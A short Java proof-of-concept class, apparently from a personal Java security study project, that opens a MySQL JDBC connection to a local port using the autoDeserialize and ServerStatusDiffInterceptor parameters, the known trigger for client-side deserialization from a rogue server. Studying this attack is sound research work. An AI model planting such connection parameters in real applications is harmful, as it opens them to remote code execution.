package com.pinger.javasec.mysql;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * @author : p1n93r
 * @date : 2021/11/2 14:11
 */
public class Bypass {

    public static void main(String[] args) throws Exception{
        Class.forName("com.mysql.jdbc.Driver");
        Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=123456&serverTimezone=GMT");
    }

}
